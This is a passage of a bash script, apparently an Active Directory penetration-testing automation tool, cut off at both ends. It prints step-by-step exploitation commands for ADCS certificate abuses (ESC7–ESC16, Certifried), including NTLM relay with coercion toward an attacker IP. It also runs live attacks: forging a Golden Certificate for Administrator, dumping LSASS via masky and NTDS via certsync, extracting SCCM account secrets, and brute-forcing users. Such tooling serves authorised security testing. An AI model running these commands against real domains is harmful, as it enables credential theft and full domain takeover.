    esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
    if [[ -n $esc7_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc7_vuln; do
            echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
            echo -e "${CYAN}1. Add a new officer:${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -add-officer '${user}' -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

    esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
    if [[ -n $esc8_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc8_vuln; do
            echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
            echo -e "${CYAN}1. Start the relay server:${NC}"
            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ] ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
            echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

    esc9_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc9_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc9_vuln; do
            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin (UPN spoofing):${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}5. Authenticate as the target administrator:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

    esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
    if [[ -n $esc11_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc11_vuln; do
            echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
            echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
            echo -e "ntlmrelayx.py -t rpc://[ ${pki_servers} ] -rpc-mode ICPR -icpr-ca-name \"${vulnca//SPACE/ }\" -smb2support"
            echo -e "_OR_"
            echo -e "${certipy} relay -target rpc://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\""
            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP} --dc-ip $dc_ip"
        done
    fi

    esc13_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC13" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc13_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC13 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc13_vuln; do
            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request a certificate from the vulnerable template:${NC}"
            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Authenticate with the obtained certificate to get a TGT:${NC}"
            echo -e "${certipy} auth -pfx ${user}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
            echo -e "${CYAN}3. Use the obtained TGT to perform privileged actions:${NC}"
            echo -e "export KRB5CCNAME=${user}.ccache"
            echo -e "secretsdump.py -just-dc-user '${dc_NETBIOS}$' ${argument_imp} -dc-ip ${dc_ip} -k -no-pass"
        done
    fi

    esc15_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC15" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc15_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC15 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc15_vuln; do
            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request a certificate injecting 'Client Authentication' Application Policy:${NC}"
            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "_OR_"
            echo -e "${CYAN}1. Request a certificate, injecting 'Certificate Request Agent' Application Policy, then using the 'Agent' certificate:${NC}"
            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi

    esc16_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC16") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
    if [[ -n $esc16_vuln ]]; then
        echo -e "\n${GREEN}[+] ESC16 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc16_vuln; do
            echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
            echo -e "${CYAN}1. Update the victim account's UPN to the target administrator's sAMAccountName:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Domain Admin ]@${dc_domain} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}2. Retrieve credentials of the victim account using Shadow Credentials:${NC}"
            echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip} -account [ Victim ] ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}3. Request a certificate as the Victim user from any suitable 'Client Authentication' template:${NC}"
            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}4. Revert the victim account's UPN:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Victim ]@${dc_domain} ${ldaps_param} ${ldapbindsign_param}"
            echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
        done
    fi
}

certifried_check() {
    if ! stat "${certipy}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            ne_adcs_enum
            echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
            if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                i=0
                for pki_server in $pki_servers; do
                    i=$((i + 1))
                    pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                    if [ "${ldaps_bool}" == true ]; then
                        ldaps_param=""
                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
                    else
                        ldaps_param="-ldap-scheme ldap"
                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
                    fi
                    if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
                    if ! grep -q "Certificate object SID is" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt" && ! grep -q "error" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"; then
                        echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                        echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                    fi
                done
                cd "${current_dir}" || exit
            else
                echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
            fi
        fi
    fi
    echo -e ""
}

certipy_ldapshell() {
    if ! stat "${certipy}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        if [ "${cert_bool}" == true ]; then
            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} -ldap-shell" 2>&1 | tee "${ADCS_dir}/certipy_ldapshell_output_${user_var}.txt"
        else
            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
        fi
    fi
    echo -e ""
}

certipy_ca_dump() {
    if ! stat "${certipy}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
        echo -e "${BLUE}[*] Certipy extract CAs and forge Golden Certificate${NC}"
            ne_adcs_enum
            domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
            current_dir=$(pwd)
            cd "${Credentials_dir}" || exit
            if [ "${ldaps_bool}" == true ]; then
                ldaps_param=""
                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
            else
                ldaps_param="-ldap-scheme ldap"
                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
            fi
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
                run_command "${certipy} forge -ca-pfx ${Credentials_dir}/${pki_ca//SPACE/_}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" | tee -a "${ADCS_dir}/certipy_forge_output_${user_var}.txt"
                if stat "${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" >/dev/null 2>&1; then
                    echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
                    echo -e "${CYAN}Authenticate using pfx of Administrator:${NC}"
                    echo -e "${certipy} auth -pfx ${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell] ${ldaps_param}"
                fi
            done
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

masky_dump() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ne_adcs_enum
        echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
        if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                for i in $(/bin/cat "${curr_targets_list}"); do
                    echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o \"CA=${pki_server}\\${pki_ca//SPACE/ }\" --log ${Credentials_dir}/lsass_dump_masky_${user_var}_${i}.txt" 2>&1
                done
            done
        else
            echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
        fi
    fi
    echo -e ""
}

certsync_ntds_dump() {
    if ! stat "${certsync}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
    else
        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_param} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
        fi
    fi
    echo -e ""
}

###### sccm: SCCM Enumeration
ne_sccm() {
    echo -e "${BLUE}[*] SCCM Enumeration using netexec${NC}"
    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${SCCM_dir}/ne_sccm_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

sccmhunter_enum() {
    if ! stat "${sccmhunter}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
    else
        echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
            if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
                run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
                run_command "${python3} ${sccmhunter} show -computers" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
                run_command "${python3} ${sccmhunter} show -groups" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
                run_command "${python3} ${sccmhunter} show -mps" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
            fi
        fi
    fi
    echo -e ""
}

sccmhunter_dump() {
    if ! stat "${sccmhunter}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
    else
        echo -e "${BLUE}[*] Adding a new computer and extracting the NAAConfig containing creds of Network Access Accounts${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
                run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
            else
                echo -e "${PURPLE}[-] No SCCM servers found! Please re-run SCCM enumeration using sccmhunter and try again..${NC}"
            fi
        fi
    fi
    echo -e ""
}

sccmsecrets_dump() {
    if ! stat "${sccmsecrets}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of sccmsecrets${NC}"
    else
        echo -e "${BLUE}[*] Using SCCMSecrets to dump policies and files${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] SCCMSecrets does not support Kerberos authentication${NC}"
        else
            echo -e "${BLUE}[*] Please specify IP or hostname of SCCM server:${NC}"
            echo -e "${CYAN}[*] Example: 10.1.0.8 or SCCM01 or SCCM01.domain.com ${NC}"
            target_sccm=""
            read -rp ">> " target_sccm </dev/tty
            while [ "${target_sccm}" == "" ]; do
                echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
                read -rp ">> " target_sccm </dev/tty
            done
            current_dir=$(pwd)
            cd "${SCCM_dir}" || exit
            if [ "${nullsess_bool}" == true ]; then
                run_command "${python3} ${sccmsecrets} policies -mp ${target_sccm} -cn WS3000" | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
                run_command "${python3} ${sccmsecrets} files -dp ${target_sccm}" | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
            else
                echo -e "${BLUE}[*] Please specify computer used for authentication (example: WS3000$, default: current user):${NC}"
                read -rp ">> " user_sccm </dev/tty
                if [[ ! ${user_sccm} == "" ]]; then
                    echo -e "${BLUE}[*] Please specify computer's password or NTLM hash:${NC}"
                    read -rp ">> " pass_sccm </dev/tty
                    while [ "${pass_sccm}" == "" ]; do
                        echo -e "${RED}Invalid password/NTLM.${NC} Please specify password/NTLM:"
                        read -rp ">> " pass_sccm </dev/tty
                    done
                    if [[ (${#pass_sccm} -eq 65 && "${pass_sccm:32:1}" == ":") || (${#pass_sccm} -eq 33 && "${pass_sccm:0:1}" == ":") || (${#pass_sccm} -eq 32) ]]; then
                        argument_secsccm="-u '${user_sccm}' -H '${pass_sccm}'"
                    else
                        argument_secsccm="-u '${user_sccm}' -p '${pass_sccm}'"
                    fi
                fi
                run_command "${python3} ${sccmsecrets} policies -mp ${target_sccm} ${argument_secsccm} -cn WS3001" | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
                run_command "${python3} ${sccmsecrets} files -dp ${target_sccm} ${argument_secsccm}" | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
            fi
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

###### gpo_enum: GPO Enumeration
ne_gpp() {
    echo -e "${BLUE}[*] GPP Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} -M gpp_autologin -M gpp_password --log ${GPO_dir}/ne_gpp_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

GPOwned_enum() {
    if ! stat "${GPOwned}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of GPOwned${NC}"
    else
        echo -e "${BLUE}[*] GPO Enumeration using GPOwned${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] GPOwned requires credentials{NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-use-ldaps"; else ldaps_param=""; fi
            run_command "${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee "${GPO_dir}/GPOwned_output_${dc_domain}.txt"
            run_command "${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a "${GPO_dir}/GPOwned_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

gpoparser_enum() {
    if ! stat "${gpoParser}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of gpoParser{NC}"
    else
        echo -e "${BLUE}[*] GPO parsing using gpoParser${NC}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] gpoParser requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            run_command "${gpoParser} remote ${argument_gpopars} -s ${dc_FQDN} -o ${GPO_dir}/GPOParser_${user_var}.out -c ${GPO_dir}" | tee "${GPO_dir}/gpoparser_output_${user_var}.txt"
        fi
    fi
    echo -e ""
}

gpb_enum() {
    if ! stat "${GroupPolicyBackdoor}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of GroupPolicyBackdoor{NC}"
    else
        echo -e "${BLUE}[*] GPO vuln enumeration using GroupPolicyBackdoor${NC}"
        if [ "${aeskey_bool}" == true ] ; then
            echo -e "${PURPLE}[-] GroupPolicyBackdoor does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            run_command "${python3} ${GroupPolicyBackdoor} enum list-gpos ${argument_gpb} --dc ${dc_ip} ${ldaps_param}" | tee "${GPO_dir}/gpbenum_output_${user_var}.txt"
        fi
    fi
    echo -e ""
}

###### bruteforce: Brute Force attacks
ridbrute_attack() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute --log ${BruteForce_dir}/ne_rid_brute_${dc_domain}.txt"
        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute --log ${BruteForce_dir}/ne_rid_brute_${dc_domain}.txt"
        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute --log ${BruteForce_dir}/ne_rid_brute_${dc_domain}.txt"
        #Parsing user lists
        grep "SidTypeUser" "${BruteForce_dir}/ne_rid_brute_${dc_domain}.txt" | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" >"${Users_dir}/users_list_ridbrute_${dc_domain}.txt" 2>&1
        parse_users
    else
        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

kerbrute_enum() {
    if [ "${nullsess_bool}" == true ]; then
        if ! stat "${kerbrute}" >/dev/null 2>&1; then
            echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
        else
            echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
            echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >>"${BruteForce_dir}/kerbrute_user_output_${dc_domain}.txt"
            grep "VALID" "${BruteForce_dir}/kerbrute_user_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${Users_dir}/users_list_kerbrute_${dc_domain}.txt" 2>&1
            if [ -s "${Users_dir}/users_list_kerbrute_${dc_domain}.txt" ]; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat "${Users_dir}/users_list_kerbrute_${dc_domain}.txt" | sort -uf
                parse_users
            fi
        fi
    else
        echo -e "${PURPLE}[-] Kerbrute null session enumeration skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

userpass_ne_check() {
    target_userslist="${users_list}"
    if [ ! -s "${users_list}" ]; then
